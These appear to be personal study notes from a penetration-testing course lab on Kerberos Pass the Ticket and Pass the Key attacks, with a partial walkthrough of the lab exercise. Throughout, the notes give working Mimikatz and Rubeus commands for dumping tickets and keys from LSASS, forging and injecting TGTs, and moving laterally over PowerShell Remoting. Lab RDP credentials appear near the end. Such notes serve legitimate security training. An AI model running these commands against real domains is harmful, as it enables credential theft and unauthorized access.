>[! note] Pass the Ticket (PtT)
> Instead of an NTLM password hash, a stolen Kerberos ticket is used to move laterally within
> an Active Directory environment.
>> 
> To perform a PtT attack we need two things:
> 
> 	1) A TGS to allow access to a service
> 	2) TGT, used to request service tickets to access any service the user has privileges


## Kerberos Refresher

Kerberos stores all tickets locally and presents each service ticket for that specific service. The **Ticket Granting Ticket (TGT)** is the first ticket. It allows clients to get additional tickets aka the TGS. **The Ticket Granting Service** is requested by users who want to use a service. This ticket allows services to verify the user's identity.

When a user requests a TGT they authenticate to the DC by encrypting the current timestamp with their password hash. The DC will validate the users identity, then grants the user a TGT for future requests.

If the user wants to connect to MSSQL, the user request a TGS to the Key Distribution Center KDC. The user presents its TGT to the KCD, then will give the TGS to the MSSQL server for authentication.

**To perform PtT you will need a valid TGT and TGS**


## Harvesting Kerberos tickets from Windows

LSASS processes and stores the tickets, therefore you must communicate with LSASS to get them. As a local admin you can get all tickets.

Use the Mimikatz module **sekurlsa::tickets /export**. This will result in a list of files with the extension .kirbi. Discussed below

### Mimikatz - Exporting tickets

![[2025-08-07 07.49.54.gif]]

>[! Important] How to tell which is a ticket?
> Tickets ending with $ correspond to the computer account.
> User tickets have the user's name, followed by an @ that separates the service and the domain.
> Example: **[randomvalue]-username@service-domain.local.kirbi**

### Rubeus - Exporting Tickets

#Rebeus can export tickets as well, via the dump option. The difference, it will print the ticket encoded in Base 64 format instead of giving us a file.

```go
Rubeus.exe dump /nowrap
```

![[Pasted image 20250807120747.png]]

## Pass the Key AKA OverPass the Hash

This approach converts a key/hash into a TGT, for a full domain-joined user. 

**Requirements**:
- Users hash

Use mimikatz `sekurlsa::ekeys` module to dump all users Kerberos encryption keys

### Mimikatz - Extract Kerberos Keys

![[Pasted image 20250807122105.png]]
	NOTE: Dumping all users Kerberos keys, with the keys above you can do the OverPass attack

### Mimikatz - PtK

Syntax
```go
sekurlsa:pth /domain:somedomain.com /user:plaintext /ntlm:TheNLTMHash
```
![[Pasted image 20250807122320.png]]

Result: a new cmd.exe window we can use to request access to any service

### Rubeus -  PtK
For #Rubeus, use asktgt

Syntax:
```go
Rubeus.exe asktgt /domain:somedomain.com /user:plaintext /aes256:PUT_AES256HASH_RIGHT_HERE
```
![[Pasted image 20250810142222.png]]

> [! Error] Potential Encryption Downgrade
>  **Note:** Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges. If we use an rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an "encryption downgrade."

## Pass the Ticket (PtT)

We have Kerberos tickets, use them for this PtT attack example.
With  #Rubeus use the `/ptt` flag to submit the ticket to the current logon session

### Rubeus - PtT

```go
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```


#### Other ways to import the ticket into the current session

**Using the .kirbi file**

```go
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```

### Convert .kirbi to Base64

We can also use the Base64 output from Rubeus or convert a .kirbi to Base64 to perform the Pass the Ticket attack.

```powershell
PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```

Follow up by providing the base64 string to #Rubeus instead of the file name

```go
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/...SNIP..
```

Doing the same with Mimikatz via the  `kerberos::ptt` module

![[2025-08-10 14.50.36.gif]]

>[!Hint] Mimikatz `misc::cmd` command
>  Instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command prompt, we can use the Mimikatz module `misc` to launch a new command prompt window with the imported ticket using the `misc::cmd` command

------

## Pass the Ticket with PowerShell Remoting

The steps:
- In a cmd.exe window, import the ticket via `kerberos::ptt`
- Launch PowerShell from the same cmd.exe and use the `Enter-PSSession` command to connect to the target machine

### Mimikatz - PtT for lateral movement

![[2025-08-10 15.45.57.gif]]

### #Rubeus - PtT via PowerShell

- The `createnetonly` option creations a sacrificial process/logon session (logon type 9)
- It's hidden by default, can be specified with the `/show` flag to display the process
- It prevents the erasure of existing TGTs for the current logon session

**Create a sacrificial processes**

This will open a new cmd window
```go
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```


From that window, we can execute Rubeus to request a new TGT with the option `/ptt` to import the ticket into our current session and connect to the DC using PowerShell Remoting
```go
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```

----

# Questions

IP
```go
10.129.51.10
```

Username
```
Administrator
```

Password
```
AnotherC0mpl3xP4$$
```

RDP
```go
xfreerdp /v:10.129.51.10 /u:Administrator /p:'AnotherC0mpl3xP4$$' /cert:ignore
```

1) Connect to the target machine using RDP and the provided creds. Export all tickets present on the computer. How many users TGT did you collect?


![[Pasted image 20250817235618.png]]

Exporting the tickets with Rubeus
```go
Rubeus.exe dump /nowrap
```

Results:
![[Pasted image 20250822130333.png]]

2) Use john's TGT to perform a Pass the Ticket attack and retrieve the flag from the shared folder \\DC01.inlanefreight.htb\john

>[!Hint] Performing PtK and PtT Attack 
> To perform a PtT attack, I need to execute a Pass the Key ( [[#Pass the Key AKA OverPass the Hash]] ) attack to forge a ticket. These are the pre-reqs:
>  - Extract a ticket via Mimikatz ( [[#Mimikatz - Extract Kerberos Keys]]) and get one of the resulting hashes via the sekurlsa::ekeys module
>  - username
>  - domain


### Get John's Hash

Use mimikatz `sekurlsa::ekeys` to extract a hash for `john`
```go
mimikatz.exe
```

```go
privilege::debug
```

```go
sekurlsa::ekeys
```

Use the AES256 hash from the key list below
![[Pasted image 20250822113313.png]]

John's AE256 HMAC
```go
9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc
```

### PtK 

#### Rubeus - Pass the Key

Domain:
```go
inlanefreight.htb
```

Command:
```go
Rubeus.exe asktgt /domain:inlanefreight.htb /user:john /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc
```

Successfully forged a TGT!!!
![[Pasted image 20250822132337.png]]

#### Rubeus - Pass the Ticket 

Now that I have a forged ticket, I can perform PtT [[#Pass the Ticket (PtT)]]

Command
```go
Rubeus.exe asktgt /domain:inlanefreight.htb /user:john /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```

Ticket was successfully imported!
![[Pasted image 20250822132831.png]]


![[Pasted image 20250822145603.png]]

